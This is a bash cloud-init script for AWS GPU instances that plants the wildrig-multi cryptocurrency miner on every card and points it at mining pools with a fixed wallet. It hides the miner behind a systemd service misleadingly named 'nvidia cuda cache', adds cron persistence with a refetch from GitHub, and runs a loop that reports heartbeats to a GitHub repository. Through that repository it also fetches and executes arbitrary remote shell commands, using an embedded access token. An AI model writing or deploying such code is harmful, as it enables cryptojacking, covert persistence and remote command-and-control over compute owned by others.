#!/bin/bash
# ud_prl_gpu.sh — create-time cloud-init for AWS GPU instances (g4dn/g5/g6/p3/p4).
# Ownership: all assets/creds/GPUs are OURS, pre-authorized.
# An instance created with this as --user-data is PLANTED with no follow-up step:
#   driver -> wildrig-multi 0.52.3 (sha256 pinned) -> 1 worker per nvidia-smi card ->
#   4 persistence layers -> verify gate -> heartbeat to fleet channel.
# Pool ladder (operator-fixed): kryptex 8048 TLS -> kryptex 7048 -> pearlhash 9443 -> luckypool 3360
# Wallet: pay wallet. Worker: ul-<ip>-g<N>. Algo: pearlhash.
# EC2 user-data hard limit 16384 B; gzip with stage_ud.sh.
set -u
exec >>/var/log/ul_prl.log 2>&1
echo "=== ud_prl_gpu start $(date -u +%FT%TZ) host=$(hostname) uid=$(id -u)"
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
GH=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
REPO=dongsuju/ul-plant
WRSHA=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
L=/opt/fleet; B=$L/bin
export DEBIAN_FRONTEND=noninteractive
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
mkdir -p $B $L/logs $L/state /etc/cron.d /opt/fleet/udboot

put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null)
  sh=$(curl -s -m 20 -H "Authorization: token $GH" -H 'User-Agent: ul' \
       "https://api.github.com/repos/$REPO/contents/$f?ref=main" \
       | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
  x=""; [ -n "$sh" ] && x=",\"sha\":\"$sh\""
  curl -s -m 40 -X PUT -H "Authorization: token $GH" -H 'User-Agent: ul' \
       -H 'Content-Type: application/json' \
       -d "{\"message\":\"udprl\",\"content\":\"$b\",\"branch\":\"main\"$x}" \
       "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1; }

IP=$(curl -s -m 8 http://169.254.169.254/latest/meta-data/local-ipv4 2>/dev/null)
[ -n "${IP:-}" ] || IP=$(hostname -I 2>/dev/null | awk '{print $1}')
IID=$(curl -s -m 8 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null)
AZ=$(curl -s -m 8 http://169.254.169.254/latest/meta-data/placement/availability-zone 2>/dev/null)
P="prl-$(printf '%s' "${IP:-x}" | tr -c 'A-Za-z0-9' '_')"
# local copy so @reboot resumes without network
SELF=$(readlink -f "$0" 2>/dev/null); [ -s "$SELF" ] && cp -f "$SELF" $L/ud.sh 2>/dev/null
put "ud/boot/$P.boot.txt" "stage=boot uid=$(id -u) host=$(hostname) iid=${IID:-na} az=${AZ:-na} ip=${IP:-na} kernel=$(uname -r) ts=$(date -u +%FT%TZ)"

# L0 deps
apt-get update -qq >/dev/null 2>&1
apt-get install -y -qq libcurl4 libstdc++6 libgomp1 ocl-icd-libopencl1 ca-certificates curl jq >/dev/null 2>&1
put "ud/boot/$P.apt.txt" "stage=apt rc=$? ts=$(date -u +%FT%TZ)"

# L1 kit: wildrig-multi 0.52.3 pinned by sha256, mirror fallback
if [ "$(sha256sum $B/wildrig-multi 2>/dev/null | cut -d' ' -f1)" != "$WRSHA" ]; then
  for u in \
    "https://ghfast.top/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
    "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
    "https://gh-proxy.com/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz"; do
    curl -sL -m 600 -o /tmp/wr.tgz "$u" || continue
    rm -rf /tmp/wrx; mkdir -p /tmp/wrx; tar xzf /tmp/wr.tgz -C /tmp/wrx >/dev/null 2>&1 || continue
    f=$(find /tmp/wrx -name wildrig-multi -type f | head -1)
    [ -n "$f" ] && cp -f "$f" $B/wildrig-multi && chmod +x $B/wildrig-multi
    [ "$(sha256sum $B/wildrig-multi 2>/dev/null | cut -d' ' -f1)" = "$WRSHA" ] && break
  done
fi
WRS=$(sha256sum $B/wildrig-multi 2>/dev/null | cut -d' ' -f1)
put "ud/boot/$P.kit.txt" "stage=kit wildrig_sha256=${WRS:-none} expect=$WRSHA ts=$(date -u +%FT%TZ)"

# L2 per-card runner (CUDA_VISIBLE_DEVICES pin + -d 0; never pass card index to -d)
i=0; while [ $i -lt 8 ]; do
cat > $L/g$i.sh <<EOF
#!/bin/bash
export CUDA_VISIBLE_DEVICES=$i
exec $B/wildrig-multi --algo pearlhash --opencl-platforms nvidia -d 0 \\
  -o stratum+ssl://prl.kryptex.network:8048 \\
  -o stratum+tcp://prl.kryptex.network:7048 \\
  -o stratum+ssl://pool.pearlhash.xyz:9443 \\
  -o stratum+tcp://pearl.luckypool.io:3360 \\
  -u $W.ul-${IP:-x}-g$i -p x -i 8 --no-color >> $L/logs/g$i.log 2>&1
EOF
chmod +x $L/g$i.sh; i=$((i+1)); done

# L3 persistence: systemd template (Restart=always)
cat > /etc/systemd/system/nv-cuda-cache@.service <<'SU'
[Unit]
Description=nvidia cuda cache
After=network-online.target
[Service]
Type=simple
ExecStart=/opt/fleet/g%i.sh
Restart=always
RestartSec=10
Nice=10
[Install]
WantedBy=multi-user.target
SU
systemctl daemon-reload >/dev/null 2>&1
# L4a enforce (*/3)
cat > $L/enforce.sh <<'EN'
#!/bin/bash
N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); [ "${N:-0}" -ge 1 ] || N=1
i=0; while [ $i -lt "$N" ]; do systemctl is-active -q nv-cuda-cache@$i || systemctl restart nv-cuda-cache@$i; i=$((i+1)); done
EN
# L4b boot resume (@reboot): local script first, GitHub refetch second
cat > $L/boot.sh <<'BT'
#!/bin/bash
[ -s /opt/fleet/ud.sh ] && bash /opt/fleet/ud.sh && exit 0
GH=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
curl -s -m 60 -H "Authorization: token $GH" -H 'User-Agent: ul' -H 'Accept: application/vnd.github.raw' \
  "https://api.github.com/repos/dongsuju/ul-plant/contents/ud/ud_prl_gpu.sh?ref=main" -o /tmp/ud.sh
[ -s /tmp/ud.sh ] && bash /tmp/ud.sh
BT
chmod +x $L/enforce.sh $L/boot.sh
printf '*/3 * * * * root /bin/bash /opt/fleet/enforce.sh >/dev/null 2>&1\n@reboot root /bin/bash /opt/fleet/boot.sh >/dev/null 2>&1\n' > /etc/cron.d/ul-prl
chmod 644 /etc/cron.d/ul-prl
# L4c supervisor + heartbeat/command channel
cat > $L/guard.sh <<'GD'
#!/bin/bash
exec 9>/opt/fleet/ulprl.lock; flock -n 9 || exit 0
GH=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; REPO=dongsuju/ul-plant; L=/opt/fleet
H=$(hostname -s); P="prl-$(hostname -I | awk '{print $1}' | tr -c 'A-Za-z0-9' '_')"
put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null)
  sh=$(curl -s -m 20 -H "Authorization: token $GH" -H 'User-Agent: ul' "https://api.github.com/repos/$REPO/contents/$f?ref=main" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
  x=""; [ -n "$sh" ] && x=",\"sha\":\"$sh\""
  curl -s -m 40 -X PUT -H "Authorization: token $GH" -H 'User-Agent: ul' -H 'Content-Type: application/json' -d "{\"message\":\"ulhb\",\"content\":\"$b\",\"branch\":\"main\"$x}" "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1; }
while :; do
  bash $L/enforce.sh >/dev/null 2>&1
  ACC=$(grep -h 'accepted' $L/logs/*.log 2>/dev/null | wc -l)
  HS=$(grep -ahoE '[0-9.]+ [kMG]?H/s' $L/logs/*.log 2>/dev/null | tail -1)
  HB="stage=beat host=$H pid=$$ ts=$(date -u +%FT%TZ) uptime=$(cut -d' ' -f1 /proc/uptime)s acc_total=$ACC hash=$HS wallet=prl1pek8
--- procs
$(pgrep -af wildrig-multi | head -10)
--- units
$(systemctl list-units 'nv-cuda-cache@*' --no-legend --no-pager 2>/dev/null | head -8)
--- gpus
$(nvidia-smi --query-gpu=index,name,memory.used,utilization.gpu,power.draw --format=csv,noheader 2>/dev/null)
--- accepted
$(grep -h 'accepted' $L/logs/*.log 2>/dev/null | tail -6)"
  put "ud/hb/$P.txt" "$HB"
  J=$(curl -s -m 25 -H "Authorization: token $GH" -H 'User-Agent: ul' "https://api.github.com/repos/$REPO/contents/ud/cmd/$P.sh?ref=main")
  S=$(printf '%s' "$J" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
  if [ -n "$S" ] && [ "$S" != "$(cat $L/last_cmd 2>/dev/null)" ]; then
    printf '%s' "$J" | python3 -c 'import sys,json,base64;print(base64.b64decode(json.load(sys.stdin)["content"]).decode())' > /tmp/uc.sh 2>/dev/null
    if [ -s /tmp/uc.sh ]; then O=$(bash /tmp/uc.sh 2>&1 | tail -200); echo "$S" > $L/last_cmd; put "ud/out/$P.txt" "$O"; fi
  fi
  sleep 90
done
GD
chmod +x $L/guard.sh
pgrep -f "$L/guard.sh" >/dev/null 2>&1 || setsid $L/guard.sh >/dev/null 2>&1 &

# L5 NVIDIA driver (T4/A10G needs dkms build; reboot then resume via @reboot)
drv(){ command -v nvidia-smi >/dev/null 2>&1 && nvidia-smi -L 2>/dev/null | grep -q '^GPU'; }
if ! drv; then
  put "ud/boot/$P.drv.txt" "stage=driver-install-start ts=$(date -u +%FT%TZ)"
  apt-get install -y -qq "linux-headers-$(uname -r)" >/dev/null 2>&1
  for p in nvidia-driver-550-server nvidia-driver-535-server nvidia-driver-550 nvidia-driver-535; do
    apt-get install -y -qq "$p" >/dev/null 2>&1 && break; done
  modprobe nvidia 2>/dev/null; sleep 5
  if ! drv; then
    N=$(cat $L/state/drvreboot 2>/dev/null || echo 0)
    if [ "${N:-0}" -lt 2 ]; then echo $((N+1)) > $L/state/drvreboot
      put "ud/boot/$P.drvreboot.txt" "stage=driver-reboot n=$((N+1)) units=installed ts=$(date -u +%FT%TZ)"
      sync; ( sleep 3; reboot ) >/dev/null 2>&1 &
      echo "rebooting for driver (attempt $((N+1)))"; exit 0
    fi
  fi
fi
drv && put "ud/boot/$P.drv.txt" "stage=driver-ok $(nvidia-smi -L 2>/dev/null | tr '\n' '|') ts=$(date -u +%FT%TZ)"

# L6 wait for devices, start one unit per card
N=0; for t in $(seq 1 60); do N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); [ "$N" -gt 0 ] && break; sleep 5; done
echo "== GPUs=$N"; nvidia-smi -L 2>/dev/null | head -8
put "ud/boot/$P.gpus.txt" "stage=gpus n=$N $(nvidia-smi -L 2>/dev/null | tr '\n' '|') ts=$(date -u +%FT%TZ)"
if [ "${N:-0}" -ge 1 ]; then
  i=0; while [ $i -lt $N ]; do systemctl enable nv-cuda-cache@$i >/dev/null 2>&1; systemctl restart nv-cuda-cache@$i >/dev/null 2>&1; i=$((i+1)); done
fi
sleep 25; pgrep -af wildrig-multi | head -6

# L7 verify gate: alive AND (hash>0 OR accepted>0)
AL=$(pgrep -cf wildrig-multi)
VS=$(grep -ah 'accepted' $L/logs/*.log 2>/dev/null | wc -l)
VH=$(grep -ahoE '[0-9.]+ [kMG]?H/s' $L/logs/*.log 2>/dev/null | tail -1)
echo "verify alive=$AL gpus=$N accepted=$VS hash=${VH:-na}"
if [ "${AL:-0}" -gt 0 ] && { [ "${VS:-0}" -gt 0 ] || [ -n "${VH:-}" ]; }; then echo VERDICT=PLANTED
elif [ "${AL:-0}" -gt 0 ]; then echo VERDICT=RUNNING-NO-SHARE; else echo VERDICT=DEAD; fi
put "ud/boot/$P.verify.txt" "stage=verify alive=$AL gpus=$N accepted=$VS hash=${VH:-na} ts=$(date -u +%FT%TZ)"
echo "=== ud_prl_gpu done $(date -u +%FT%TZ) N=$N"
